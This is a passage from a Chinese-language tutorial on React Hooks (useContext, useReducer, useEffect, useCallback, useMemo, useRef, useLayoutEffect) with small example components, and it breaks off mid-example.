setState(state =&gt; ({ ...state, key01: val001, key02: val002 }));
</code></pre>
<p>&#x4E0D;&#x76F8;&#x5173;&#x7684;&#x72B6;&#x6001;&#x63A8;&#x8350;&#x62C6;&#x5206;&#x4E3A;&#x591A;&#x7EC4;&#x72B6;&#x6001;&#x53D8;&#x91CF;&#xFF1B;&#x76F8;&#x4E92;&#x5173;&#x8054;&#x6216;&#x4E92;&#x76F8;&#x4F9D;&#x8D56;&#x7684;&#x7684;&#x72B6;&#x6001;&#x5EFA;&#x8BAE;&#x5408;&#x5E76;&#x4E3A;&#x5355;&#x7EC4;&#x72B6;&#x6001;&#x53D8;&#x91CF;&#x3002;&#x628A;&#x72EC;&#x7ACB;&#x7684;&#x72B6;&#x6001;&#x53D8;&#x91CF;&#x62C6;&#x5206;&#x5F00;&#x8FD8;&#x6709;&#x53E6;&#x5916;&#x7684;&#x597D;&#x5904;&#x3002;&#x5728;&#x540E;&#x671F;&#x5C06;&#x4E00;&#x4E9B;&#x76F8;&#x5173;&#x7684;&#x903B;&#x8F91;&#x62BD;&#x53D6;&#x5230;&#x4E00;&#x4E2A;&#x81EA;&#x5B9A;&#x4E49; Hook &#x53D8;&#x5F97;&#x66F4;&#x5BB9;&#x6613;&#x3002;</p>
<pre><code class="language-js">function Box() {
  const position = useWindowPosition();
  const [size, setSize] = useState({ width: 100, height: 100 });
  // ...
}

function useWindowPosition() {
  const [position, setPosition] = useState({ left: 0, top: 0 });
  useEffect(() =&gt; {
    // ...
  }, []);
  return position;
}
</code></pre>
<ul>
<li>&#x7EC4;&#x4EF6;&#x4E4B;&#x95F4;&#x5171;&#x4EAB;&#x72B6;&#x6001; Hook =&gt; useContext</li>
</ul>
<p>Context &#x4E0A;&#x4E0B;&#x6587;&#x72B6;&#x6001;&#x5206;&#x53D1;&#x7528;&#x4E8E;&#x66FF;&#x4EE3; React &#x9010;&#x5C42;&#x4EE5; props &#x4F20;&#x9012;&#x7684;&#x5168;&#x5C40;&#x6570;&#x636E;&#x3002;</p>
<pre><code class="language-jsx">Context &#x5E38;&#x7528; API =&gt; React.createContext&#x3001;Context.Provider&#x3001;Context.Consumer&#x3001;Class.contextType&#x3001;Context.displayName
</code></pre>
<p>&#x5F53;&#x7EC4;&#x4EF6;&#x4E0A;&#x5C42;&#x6700;&#x8FD1;&#x7684; &lt;XxxContext.Provider&gt; &#x66F4;&#x65B0;&#x65F6;&#xFF0C;&#x8BE5; Hook &#x4F1A;&#x89E6;&#x53D1;&#x91CD;&#x6E32;&#x67D3;&#xFF0C;&#x5E76;&#x4F7F;&#x7528;&#x6700;&#x65B0;&#x4F20;&#x9012;&#x7684;&#x6570;&#x636E;&#x3002;&#x4E0D;&#x53D7;&#x9650;&#x4E8E; React.memo &#x6216; shouldComponentUpdate&#x3002;</p>
<p>&#x4E0A;&#x4E0B;&#x6587;&#x5BF9;&#x8C61;&#x521B;&#x5EFA;&#x65F6;&#x5373;&#x53EF;&#x521D;&#x59CB;&#x5316;&#x4F20;&#x9012;&#x9ED8;&#x8BA4;&#x503C;&#x4F5C;&#x53C2;&#x6570;&#x3002;&#x5B9E;&#x9645;&#x4EE5; &lt;XxxContext.Provider&gt; &#x6807;&#x7B7E;&#x4E2D; value prop &#x51B3;&#x5B9A;&#x5F53;&#x524D;&#x503C;&#x3002;</p>
<pre><code class="language-jsx">const XxxContext = React.createContext(_defaultValue);
...
&lt;XxxContext.Provider value=_finalValue&gt;
  &lt;Isolation /&gt;
&lt;/XxxContext.Provider&gt;
</code></pre>
<p>useContext Hook &#x7684;&#x53C2;&#x6570;&#x5FC5;&#x987B;&#x662F;&#x4E0A;&#x4E0B;&#x6587;&#x5BF9;&#x8C61;&#x672C;&#x8EAB; =&gt; useContext(XxxContext)&#x3002;</p>
<pre><code class="language-jsx">const _xxx = useContext(XxxContext);
...
_variable01: _xxx.attr01
</code></pre>
<pre><code class="language-jsx">import React, { useState, createContext, useContext } from &quot;react&quot;;
const CountContext = createContext();
function UseContexthook() {
  const [count, setCount] = useState(6);
  return (
    &lt;div&gt;
      &lt;p&gt;You clicked {count} times&lt;/p&gt;
      &lt;button
        onClick={() =&gt; {
          setCount(count + 1);
        }}
      &gt;
        click me
      &lt;/button&gt;
      &lt;CountContext.Provider value={count}&gt;
        &lt;Isolation /&gt;
      &lt;/CountContext.Provider&gt;
    &lt;/div&gt;
  );
}
function Isolation() { // &#x9694;&#x79BB;&#x7EC4;&#x4EF6;
  return (
    &lt;Counter /&gt;
  )
}
function Counter() {
  const count = useContext(CountContext); //&#x4E00;&#x53E5;&#x8BDD;&#x5C31;&#x53EF;&#x4EE5;&#x5F97;&#x5230;count
  return &lt;h3&gt;{count}&lt;/h3&gt;;
}
export default UseContexthook;
</code></pre>
<ul>
<li>&#x72B6;&#x6001;&#x5173;&#x8054;&#x590D;&#x6742;&#x7684; useState &#x66FF;&#x4EE3;&#x65B9;&#x6848; =&gt; useReducer</li>
</ul>
<p>useReducer &#x9002;&#x7528;&#x4E8E;&#x591A;&#x65B9;&#x5F0F;&#x66F4;&#x65B0; state&#xFF0C;&#x6216;&#x4F9D;&#x8D56;&#x4E8E; oldState &#x7684;&#x60C5;&#x51B5;&#x3002;dispatch &#x53EF;&#x4EE5;&#x5411;&#x6DF1;&#x5C42;&#x7EA7;&#x7684;&#x5B50;&#x7EC4;&#x4EF6;&#x4F20;&#x9012;&#x3002;</p>
<pre><code class="language-jsx">const [state, dispatch] = useReducer(reducer, initialArg, init);
</code></pre>
<p>reducer =&gt; &#x63A5;&#x6536;&#x72B6;&#x6001; state &#x548C;&#x52A8;&#x4F5C; action&#xFF0C;&#x8FD4;&#x56DE;&#x4E0E; dispatch &#x914D;&#x5957;&#x7684;&#x72B6;&#x6001;&#x66F4;&#x65B0;&#x903B;&#x8F91;&#x3002;</p>
<pre><code class="language-jsx">function reducer(state, action) {
  switch (action.type) {
    case &apos;type01&apos;:
      return {xxx: state.xxx + operation01};
    case &apos;type02&apos;:
      return {xxx: state.xxx + operation02};
    default:
      throw new Error();
  }
}
...
&lt;button onClick={() =&gt; dispatch({type: &apos;type01&apos;})}&gt;operation01&lt;/button&gt;
</code></pre>
<p>&#x60F0;&#x6027;&#x521D;&#x59CB;&#x5316;&#x521B;&#x5EFA;&#x521D;&#x59CB; state =&gt; &#x5C06; init &#x51FD;&#x6570;&#x4F5C;&#x4E3A; useReducer &#x7684;&#x7B2C;&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#x4F20;&#x5165;&#xFF0C;&#x521D;&#x59CB; state &#x5C06;&#x88AB;&#x8BBE;&#x7F6E;&#x4E3A; init(initialArg)&#x3002;</p>
<p>&#x8FD9;&#x4E48;&#x505A;&#x53EF;&#x4EE5;&#x5C06;&#x7528;&#x4E8E;&#x8BA1;&#x7B97; state &#x7684;&#x903B;&#x8F91;&#x63D0;&#x53D6;&#x5230; reducer &#x5916;&#x90E8;&#xFF0C;&#x8FD9;&#x4E5F;&#x4E3A;&#x5C06;&#x6765;&#x5BF9;&#x91CD;&#x7F6E; state &#x7684; action &#x505A;&#x5904;&#x7406;&#x63D0;&#x4F9B;&#x4FBF;&#x5229;&#x3002;</p>
<pre><code class="language-js">import React, { useReducer } from &quot;react&quot;;

const initCount = 0;

const init = (initCount) =&gt; {
  return { count: initCount };
};

const reducer = (state, action) =&gt; {
  switch (action.type) {
    case &quot;increment&quot;:
      return { count: state.count + 1 };
    case &quot;decrement&quot;:
      return { count: state.count - 1 };
    case &quot;reset&quot;:
      return init(action.payload || 0);
    default:
      throw new Error();
  }
};
const UseReducerHook = () =&gt; {
  const [state, dispatch] = useReducer(reducer, initCount, init);

  return (
    &lt;div className=&quot;App&quot;&gt;
      &lt;div&gt;useReducer Count:{state.count}&lt;/div&gt;
      &lt;button
        onClick={() =&gt; {
          dispatch({ type: &quot;decrement&quot; });
        }}
      &gt;
        useReducer &#x51CF;&#x5C11;
      &lt;/button&gt;
      &lt;button
        onClick={() =&gt; {
          dispatch({ type: &quot;increment&quot; });
        }}
      &gt;
        useReducer &#x589E;&#x52A0;
      &lt;/button&gt;
      &lt;button
        onClick={() =&gt; {
          dispatch({ type: &quot;reset&quot;, payload: 999 });
        }}
      &gt;
        resetTo 999
      &lt;/button&gt;
    &lt;/div&gt;
  );
};
export default UseReducerHook;
</code></pre>
<blockquote>
<p>&#x5982;&#x679C; Reducer Hook &#x7684;&#x8FD4;&#x56DE;&#x503C;&#x4E0E;&#x5F53;&#x524D; state &#x76F8;&#x540C;&#xFF0C;React &#x5C06;&#x8DF3;&#x8FC7;&#x5B50;&#x7EC4;&#x4EF6;&#x7684;&#x6E32;&#x67D3;&#x53CA;&#x526F;&#x4F5C;&#x7528;&#x7684;&#x6267;&#x884C;&#x3002;&#xFF08;React &#x4F7F;&#x7528; <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/is#description">Object.is &#x6BD4;&#x8F83;&#x7B97;&#x6CD5;</a> &#x6765;&#x6BD4;&#x8F83; state&#x3002;&#xFF09;</p>
</blockquote>
<blockquote>
<p>&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;React &#x53EF;&#x80FD;&#x4ECD;&#x9700;&#x8981;&#x5728;&#x8DF3;&#x8FC7;&#x6E32;&#x67D3;&#x524D;&#x518D;&#x6B21;&#x6E32;&#x67D3;&#x8BE5;&#x7EC4;&#x4EF6;&#x3002;&#x4E0D;&#x8FC7;&#x7531;&#x4E8E; React &#x4E0D;&#x4F1A;&#x5BF9;&#x7EC4;&#x4EF6;&#x6811;&#x7684;&#x201C;&#x6DF1;&#x5C42;&#x201D;&#x8282;&#x70B9;&#x8FDB;&#x884C;&#x4E0D;&#x5FC5;&#x8981;&#x7684;&#x6E32;&#x67D3;&#xFF0C;&#x6240;&#x4EE5;&#x5927;&#x53EF;&#x4E0D;&#x5FC5;&#x62C5;&#x5FC3;&#x3002;&#x5982;&#x679C;&#x4F60;&#x5728;&#x6E32;&#x67D3;&#x671F;&#x95F4;&#x6267;&#x884C;&#x4E86;&#x9AD8;&#x5F00;&#x9500;&#x7684;&#x8BA1;&#x7B97;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; useMemo &#x6765;&#x8FDB;&#x884C;&#x4F18;&#x5316;&#x3002;</p>
</blockquote>
<h3 id="%E5%9B%A0%E5%8F%98%E9%87%8F-hook">&#x56E0;&#x53D8;&#x91CF; Hook</h3>
<ul>
<li>&#x751F;&#x547D;&#x5468;&#x671F;&#x66FF;&#x4EE3; =&gt; useEffect Hook</li>
</ul>
<p>&#x7C7B;&#x7EC4;&#x4EF6;&#x901A;&#x8FC7;&#x751F;&#x547D;&#x5468;&#x671F;&#x51FD;&#x6570;&#x5904;&#x7406;&#x526F;&#x4F5C;&#x7528;&#x64CD;&#x4F5C;&#xFF0C;&#x4F46;&#x662F;&#x5B58;&#x5728;&#x7F16;&#x5199;&#x91CD;&#x590D;&#x4EE3;&#x7801;&#x7684;&#x5F0A;&#x7AEF;&#x3002;&#x6B64;&#x65F6;&#x53EF;&#x4EE5;&#x5728;&#x7EC4;&#x4EF6;&#x5185;&#x90E8;&#x8C03;&#x7528; useEffect &#x76F4;&#x63A5;&#x8BBF;&#x95EE; state &#x53D8;&#x91CF;&#x6216;&#x5176;&#x4ED6; props&#x3002;</p>
<p>&#x9ED8;&#x8BA4; useEffect &#x5728;&#x6E32;&#x67D3;&#xFF08;&#x7B2C;&#x4E00;&#x6B21;&#x6E32;&#x67D3;&#x4E4B;&#x540E;&#x548C;&#x6BCF;&#x6B21;&#x66F4;&#x65B0;&#xFF09;&#x4E4B;&#x540E;&#x90FD;&#x4F1A;&#x6267;&#x884C;&#x3002;</p>
<p>&#x6E32;&#x67D3;&#x540E;&#x6267;&#x884C;&#x7684;&#x526F;&#x4F5C;&#x7528;&#x51FD;&#x6570;&#x79F0;&#x4E3A; effect&#xFF0C;&#x5728; DOM &#x66F4;&#x65B0;&#x4E4B;&#x540E;&#x6267;&#x884C;&#x3002;</p>
<blockquote>
<p>useEffect &#x53EF;&#x770B;&#x505A;&#x751F;&#x547D;&#x5468;&#x671F;&#x51FD;&#x6570; componentDidMount&#x3001;componentDidUpdate &#x548C; componentWillUnmount &#x7684;&#x7EC4;&#x5408;&#x3002;</p>
</blockquote>
<blockquote>
<p>&#x65E0;&#x9700;&#x6E05;&#x9664;&#x7684; effect =&gt; &#x53D1;&#x9001;&#x7F51;&#x7EDC;&#x8BF7;&#x6C42;&#xFF0C;&#x624B;&#x52A8;&#x53D8;&#x66F4; DOM&#xFF0C;&#x8BB0;&#x5F55;&#x65E5;&#x5FD7;&#x3002;<br>
&#x9700;&#x8981;&#x6E05;&#x9664;&#x7684; effect =&gt; &#x8BA2;&#x9605;&#x5916;&#x90E8;&#x6570;&#x636E;&#x6E90;&#xFF0C;&#x76D1;&#x542C;&#x3002;</p>
</blockquote>
<p>useEffect Hook &#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x51FD;&#x6570;&#xFF0C;&#x5185;&#x90E8;&#x6CE8;&#x518C;&#x526F;&#x4F5C;&#x7528;&#x64CD;&#x4F5C;&#x548C;&#x76D1;&#x542C;&#x5668;&#xFF0C;&#x8FD4;&#x56DE;&#x51FD;&#x6570;&#x7528;&#x4E8E;&#x6E05;&#x9664;&#x76D1;&#x542C;&#x7684;&#x903B;&#x8F91;&#x3002;useEffect Hook &#x7684;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x4F9D;&#x8D56;&#x6570;&#x7EC4;&#xFF0C;&#x53EA;&#x6709;&#x5F53;&#x6240;&#x4F9D;&#x8D56;&#x7684;&#x72B6;&#x6001;&#x6216; prop &#x6539;&#x53D8;&#x65F6;&#x624D;&#x4F1A;&#x8C03;&#x7528; useEffect Hook&#x3002;</p>
<p>&#x4F20;&#x5165;&#x7A7A;&#x6570;&#x7EC4;&#x548C;&#x4E0D;&#x4F20;&#x5165;&#x6570;&#x7EC4;&#x7684;&#x6548;&#x679C;&#x4E0D;&#x540C;&#x3002;&#x524D;&#x8005;&#x662F;&#x53EA;&#x5728;&#x9996;&#x6B21;&#x66F4;&#x65B0;&#x65F6;&#x6267;&#x884C;&#xFF0C;&#x540E;&#x7EED;&#x66F4;&#x65B0;&#x4E0D;&#x6267;&#x884C;&#xFF1B;&#x540E;&#x8005;&#x662F;&#x6E32;&#x67D3;&#x5373;&#x6267;&#x884C;&#x3002;</p>
<pre><code class="language-jsx">[] =&gt; componentDidMount&#x3001;componentWillUnMount
&#x4E0D;&#x4F20;&#x5165; [] =&gt; componentDidMount&#x3001;componentDidUpdate &#x548C; componentWillUnmount
</code></pre>
<p><a href="https://stackoverflow.com/questions/56800694/what-is-the-expected-return-of-useeffect-used-for">SOF</a> =&gt; state &#x6216; props &#x53D8;&#x66F4;&#x65F6;&#xFF0C;&#x51FD;&#x6570;&#x7EC4;&#x4EF6;&#x7684; useEffect &#x4F1A;&#x5148;&#x6267;&#x884C; effect &#x7684; return &#x6240;&#x8FD4;&#x56DE;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x518D;&#x6267;&#x884C; effect &#x51FD;&#x6570;&#x4F53;&#x4E2D;&#x7684;&#x526F;&#x4F5C;&#x7528;&#x5185;&#x5BB9;&#x3002;</p>
<pre><code class="language-js">import React, { useState, useEffect } from &quot;react&quot;;
import { BrowserRouter as Router, Route, Link, Routes } from &quot;react-router-dom&quot;;
function Index() {
  useEffect(() =&gt; {
    console.log(&quot;useEffect=&gt;Indexpage&quot;);
    return () =&gt; {
      console.log(&quot;Bye, Index page&quot;);
    };
  }, []);
  return &lt;p&gt;indexPage&lt;/p&gt;;
}

function OtherPage() {
  useEffect(() =&gt; {
    console.log(&quot;useEffect=&gt;otherPage&quot;);
    return () =&gt; {
      console.log(&quot;Bye, Other page&quot;);
    };
  }, []);
  return &lt;p&gt;otherPage&lt;/p&gt;;
}
function useEffectHook() {
  const [count, setCount] = useState(0);
  useEffect(() =&gt; {
    console.log(`useEffect=&gt;You clicked ${count} times`);
    return () =&gt; {
      console.log(&quot;DONE&quot;);
    };
  }, [count]);
  return (
    &lt;div&gt;
      &lt;p&gt;You clicked {count} times&lt;/p&gt;
      &lt;button
        onClick={() =&gt; {
          setCount(count + 1);
        }}
      &gt;
        click me
      &lt;/button&gt;
      &lt;br /&gt;
      &lt;Router&gt;
        &lt;Link to=&quot;/&quot;&gt;indexPage&lt;/Link&gt; &amp; &lt;Link to=&quot;/otherPage&quot;&gt;otherPage&lt;/Link&gt;
        &lt;Routes&gt;
          &lt;Route path=&quot;/&quot; exact element={&lt;Index /&gt;} /&gt;
          &lt;Route path=&quot;/otherPage&quot; element={&lt;OtherPage /&gt;} /&gt;
        &lt;/Routes&gt;
      &lt;/Router&gt;
    &lt;/div&gt;
  );
}
export default useEffectHook;
</code></pre>
<ul>
<li>&#x51CF;&#x5C11;&#x7EC4;&#x4EF6;&#x7684;&#x66F4;&#x65B0;&#x9891;&#x7387; =&gt; useCallback</li>
</ul>
<p>&#x5728;&#x51FD;&#x6570;&#x7EC4;&#x4EF6;&#x4E2D;&#xFF0C;&#x5B9A;&#x4E49;&#x5728;&#x7EC4;&#x4EF6;&#x5185;&#x90E8;&#x7684;&#x51FD;&#x6570;&#x4F1A;&#x968F;&#x7740;&#x72B6;&#x6001;&#x7684;&#x66F4;&#x65B0;&#x800C;&#x91CD;&#x65B0;&#x6E32;&#x67D3;&#xFF0C;&#x5373;&#x51FD;&#x6570;&#x4E2D;&#x5B9A;&#x4E49;&#x7684;&#x51FD;&#x6570;&#x4F1A;&#x88AB;&#x9891;&#x7E41;&#x5B9A;&#x4E49;&#x3002;&#x5728;&#x7236;&#x5B50;&#x7EC4;&#x4EF6;&#x901A;&#x8BAF;&#x7684;&#x60C5;&#x51B5;&#x4E2D;&#xFF0C;&#x662F;&#x7279;&#x522B;&#x6D88;&#x8017;&#x6027;&#x80FD;&#x7684;&#x3002;</p>
<p>useCallback &#x63A5;&#x6536;&#x4E00;&#x4E2A;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x548C;&#x4F9D;&#x8D56;&#x6570;&#x7EC4;&#xFF0C;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A; memoized &#x56DE;&#x8C03;&#x51FD;&#x6570;&#x3002;</p>
<pre><code class="language-jsx">const memoizedCallback = useCallback(
  () =&gt; {
    doSomething(a, b);
  },
  [a, b],
);
</code></pre>
<p>&#x51FD;&#x6570;&#x7EC4;&#x4EF6;&#x901A;&#x8BAF;&#x65F6;&#xFF0C;&#x7236;&#x7EC4;&#x4EF6;&#x7684;&#x72B6;&#x6001;&#x53D8;&#x5316;&#x4F1A;&#x5BFC;&#x81F4;&#x5185;&#x90E8;&#x7684;&#x51FD;&#x6570;&#x88AB;&#x91CD;&#x65B0;&#x5B9A;&#x4E49;&#xFF0C;&#x90A3;&#x4E48;&#x5728;&#x5C06;&#x6B64;&#x88AB;&#x91CD;&#x65B0;&#x5B9A;&#x4E49;&#x7684;&#x51FD;&#x6570;&#x4F5C;&#x4E3A;&#x4F20;&#x5165;&#x5B50;&#x7EC4;&#x4EF6;&#x7684; props &#x7684;&#x503C;&#x65F6;&#xFF0C;&#x4F1A;&#x5BFC;&#x81F4;&#x5B50;&#x7EC4;&#x4EF6;&#x91CD;&#x65B0;&#x6E32;&#x67D3;&#x3002;</p>
<blockquote>
<p>React.memo &#x53EA;&#x80FD;&#x4FDD;&#x8BC1;&#x5728;&#x76F8;&#x540C; props &#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x8DF3;&#x8FC7;&#x6E32;&#x67D3;&#x7EC4;&#x4EF6;&#x7684;&#x64CD;&#x4F5C;&#x5E76;&#x76F4;&#x63A5;&#x590D;&#x7528;&#x6700;&#x8FD1;&#x4E00;&#x6B21;&#x6E32;&#x67D3;&#x7684;&#x7ED3;&#x679C;&#x3002;</p>
</blockquote>
<pre><code class="language-jsx">import React, { useState, useCallback } from &quot;react&quot;;
function UseCallbackHook() {
  const [count, setCount] = useState(0);
  const handleClick = () =&gt; {
    setCount(count + 1);
  };
  const subClick01 = () =&gt; {};
  const subClick02 = useCallback(() =&gt; {}, []);
  return (
    &lt;div&gt;
      &lt;span&gt;{count}&lt;/span&gt;&amp;nbsp;&amp;nbsp;
      &lt;button onClick={handleClick}&gt;Sup Increment&lt;/button&gt;
      &lt;Sub01 click={subClick01} /&gt;
      &lt;Sub02 click={subClick02} /&gt;
    &lt;/div&gt;
  );
}
// React.memo &#x5305;&#x88F9;&#x5B50;&#x7EC4;&#x4EF6;&#x907F;&#x514D;&#x89E6;&#x53D1; =&gt; &#x4E0D;&#x4F20;&#x5165;&#x53D8;&#x5316;&#x7684; props &#x65F6;&#x53EF;&#x884C;
const Sub01 = React.memo(function Sub01() {
  console.log(&quot;Sub01 Component is triggered&quot;);
  return (
    &lt;&gt;
      &lt;p&gt;Hello Sub01&lt;/p&gt;
    &lt;/&gt;
  );
});
const Sub02 = React.memo(function Sub02() {
  console.log(&quot;Sub02 Component is triggered&quot;);
  return (
    &lt;&gt;
      &lt;p&gt;Hello Sub02&lt;/p&gt;
    &lt;/&gt;
  );
});
export default UseCallbackHook;
</code></pre>
<ul>
<li>&#x7C7B;&#x4F3C;&#x8BA1;&#x7B97;&#x5C5E;&#x6027;&#x7684;&#x76D1;&#x542C; =&gt; useMemo</li>
</ul>
<p>useMemo &#x4F20;&#x5165;&#x7684;&#x51FD;&#x6570;&#x5185;&#x90E8;&#x5FC5;&#x987B;&#x6709;&#x8FD4;&#x56DE;&#x503C;&#xFF1B;useMemo &#x53EA;&#x80FD;&#x58F0;&#x660E;&#x5728;&#x51FD;&#x6570;&#x7EC4;&#x4EF6;&#x5185;&#x90E8;&#x3002;</p>
<p>useMemo &#x63A5;&#x6536;&#x4E00;&#x4E2A;&#x5177;&#x6709;&#x8FD4;&#x56DE;&#x503C;&#x7684;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x548C;&#x4F9D;&#x8D56;&#x6570;&#x7EC4;&#xFF0C;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A; memoized &#x503C;&#x3002;</p>
<p>React.memo &#x7684;&#x4F7F;&#x7528;&#x4F4D;&#x7F6E;&#x5904;&#x4E8E;&#x51FD;&#x6570;&#x5F0F;&#x7EC4;&#x4EF6;&#x7684;&#x5916;&#x56F4;&#xFF0C;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x7528; useMemo &#x66FF;&#x4EE3;&#x3002;</p>
<pre><code class="language-jsx">import React, { useState, useMemo } from &quot;react&quot;;
function UseMemoHook() {
  const [a, setA] = useState(0);
  const [b, setB] = useState(0);
  const [d, setD] = useState(0);
  const handleClick = (action) =&gt; {
    switch (action.type) {
      case &quot;a&quot;:
        setA(a + 1);
        break;
      case &quot;b&quot;:
        setB(b + 1);
        break;
      case &quot;d&quot;:
        setD(d + 1);
        break;
      default:
        return false;
    }
  };
  const c = useMemo(() =&gt; {
    console.log(&quot;useMemo&quot;);
    return (
      &lt;&gt;
        &lt;span&gt;{a + b}&lt;/span&gt;
        &lt;span&gt; - DOM &#x8F93;&#x51FA;&lt;/span&gt;
      &lt;/&gt;
    );
  }, [a, b]);
  return (
    &lt;&gt;
      &lt;p&gt;a: {a}&lt;/p&gt;
      &lt;p&gt;b: {b}&lt;/p&gt;
      &lt;p&gt;c: {c}&lt;/p&gt;
      &lt;p&gt;d: {d}&lt;/p&gt;
      &lt;button
        onClick={() =&gt; {
          handleClick({ type: &quot;a&quot; });
        }}
      &gt;
        +a
      &lt;/button&gt;
      &lt;button
        onClick={() =&gt; {
          handleClick({ type: &quot;b&quot; });
        }}
      &gt;
        +b
      &lt;/button&gt;
      &lt;button
        onClick={() =&gt; {
          handleClick({ type: &quot;d&quot; });
        }}
      &gt;
        +d
      &lt;/button&gt;
    &lt;/&gt;
  );
}
export default UseMemoHook;
</code></pre>
<h3 id="%E9%A2%9D%E5%A4%96%E7%9A%84-hook">&#x989D;&#x5916;&#x7684; Hook</h3>
<ul>
<li>useRef =&gt; &#x8FD4;&#x56DE; ref &#x5BF9;&#x8C61;</li>
</ul>
<blockquote>
<p>useRef returns a mutable ref object whose .current property is initialized to the passed argument (initialValue). The returned object will persist for the full lifetime of the component.</p>
</blockquote>
<p>createRef &#x8FD4;&#x56DE;&#x7684; ref &#x5BF9;&#x8C61;&#x4F1A;&#x968F;&#x7740;&#x51FD;&#x6570;&#x7EC4;&#x4EF6;&#x7684;&#x6E32;&#x67D3;&#x800C;&#x91CD;&#x65B0;&#x521D;&#x59CB;&#x5316;&#xFF0C;useRef &#x8FD4;&#x56DE;&#x7684; ref &#x5BF9;&#x8C61;&#x5728;&#x7EC4;&#x4EF6;&#x7684;&#x6574;&#x4E2A;&#x751F;&#x547D;&#x5468;&#x671F;&#x5185;&#x90FD;&#x4F1A;&#x6301;&#x7EED;&#x5B58;&#x5728;&#x3002;</p>
<p>useRef() &#x53EF;&#x4EE5;&#x65B9;&#x4FBF;&#x5730;&#x4FDD;&#x5B58;&#x4EFB;&#x4F55;&#x53EF;&#x53D8;&#x503C;&#xFF0C;&#x7C7B;&#x4F3C;&#x4E8E;&#x5728; class &#x4E2D;&#x4F7F;&#x7528;&#x5B9E;&#x4F8B;&#x5B57;&#x6BB5;&#x7684;&#x65B9;&#x5F0F;&#x3002;</p>
<pre><code class="language-jsx">import React, { useRef, useState, useEffect } from &quot;react&quot;;
function UseRefHook() {
  const [renderTimes, setRenderTimes] = useState(0);
  const refByUseRef = useRef();
  let thisVal = &quot;hello useRef&quot;;
  const refLikeThis = useRef(thisVal);
  const refByCreateRef = React.createRef();
  if (!refByUseRef.current) {
    refByUseRef.current = renderTimes;
  }
  if (!refByCreateRef.current) {
    refByCreateRef.current = renderTimes;
  }
  useEffect(() =&gt; {
    console.log(refLikeThis);
  });
  return (
    &lt;&gt;
      &lt;span&gt;renderTimes: {renderTimes}&lt;/span&gt;&amp;nbsp;&amp;nbsp;
      &lt;span&gt;refByUseRef: {refByUseRef.current}&lt;/span&gt;&amp;nbsp;
      &lt;span&gt;refByCreateRef: {refByCreateRef.current}&lt;/span&gt;&amp;nbsp;&amp;nbsp;
      &lt;br /&gt;
      &lt;button
        onClick={() =&gt; {
          setRenderTimes((time) =&gt; time + 1);
        }}
      &gt;
        render now
      &lt;/button&gt;
    &lt;/&gt;
  );
}
export default UseRefHook;
</code></pre>
<ul>
<li>useLayoutEffect =&gt;  DOM &#x53D8;&#x66F4;&#x4E4B;&#x540E;&#x540C;&#x6B65;&#x8C03;&#x7528; effect</li>
</ul>
<p>useEffect &#x53EF;&#x4EE5;&#x6EE1;&#x8DB3;&#x7EDD;&#x5927;&#x591A;&#x6570;&#x7684;&#x5F00;&#x53D1;&#x573A;&#x666F;&#xFF0C;&#x800C; useLayoutEffect &#x53EF;&#x80FD;&#x4F1A;&#x963B;&#x585E;&#x6E32;&#x67D3;&#xFF0C;&#x9700;&#x8981;&#x8C28;&#x614E;&#x4F7F;&#x7528;&#x3002;</p>
<p>useEffect &#x9ED8;&#x8BA4;&#x5728;&#x6BCF;&#x8F6E;&#x6E32;&#x67D3;&#x7ED3;&#x675F;&#x540E;&#x6267;&#x884C;&#xFF0C;&#x800C; useLayoutEffect &#x5728;&#x6D4F;&#x89C8;&#x5668;&#x6267;&#x884C;&#x7ED8;&#x5236;&#x4E4B;&#x524D;&#x6267;&#x884C;&#xFF0C;&#x5E38;&#x7528;&#x4F5C;&#x89E3;&#x51B3;&#x9875;&#x9762;&#x95EA;&#x52A8;&#x7684;&#x95EE;&#x9898;&#x3002;</p>
<p>&#x521B;&#x5EFA;&#x5E76;&#x8C03;&#x7528;&#x51FD;&#x6570;&#x7EC4;&#x4EF6; =&gt; &#x66F4;&#x65B0; DOM =&gt; useLayoutEffect =&gt; &#x6E32;&#x67D3;&#x89C6;&#x56FE; =&gt; useEffect =&gt; &#x4FA6;&#x6D4B;&#x5230;&#x72B6;&#x6001;&#x6539;&#x53D8;&#x91CD;&#x65B0;&#x6267;&#x884C;&#x51FD;&#x6570;&#x7EC4;&#x4EF6; =&gt; &#x548C; Virtual DOM &#x6BD4;&#x8F83;&#x540E;&#x66F4;&#x65B0; DOM =&gt; &#x8C03;&#x7528; useLayoutEffect =&gt; &#x6E32;&#x67D3;&#x89C6;&#x56FE; =&gt; useEffect =&gt; &#x7EC4;&#x4EF6;&#x88AB;&#x79FB;&#x9664; =&gt; useLayoutEffect =&gt; &#x8C03;&#x7528; useEffect&#x3002;</p>
<p>useInsertionEffect &#x5728;&#x6240;&#x6709; DOM &#x7A81;&#x53D8;&#x4E4B;&#x524D;&#x540C;&#x6B65;&#x89E6;&#x53D1;&#xFF0C;&#x53EF;&#x5C06;&#x6837;&#x5F0F;&#x6CE8;&#x5165; DOM&#x3002;&#x7531;&#x4E8E;&#x5176;&#x6267;&#x884C;&#x7684;&#x65F6;&#x673A;&#xFF0C;&#x4E0D;&#x80FD;&#x8BBF;&#x95EE; refs&#xFF0C;&#x4E5F;&#x4E0D;&#x80FD;&#x5B89;&#x6392;&#x66F4;&#x65B0;&#x3002;</p>
<pre><code class="language-jsx">import React, { useEffect, useLayoutEffect, useState } from &quot;react&quot;;
function UseLayoutEffectHook() {
  const [state, setState] = useState(0);
  console.log(&quot;render&quot;, state);
  useEffect(() =&gt; {
    console.log(&quot;useEffect render&quot;, state);
  }, [state]);
  useLayoutEffect(() =&gt; {
    console.log(&quot;useLayoutEffect render&quot;, state);
  }, [state]);
  return (
    &lt;&gt;
      &lt;button
        onClick={() =&gt; {
          setState(state + 1);
        }}
      &gt;
        state: {state}
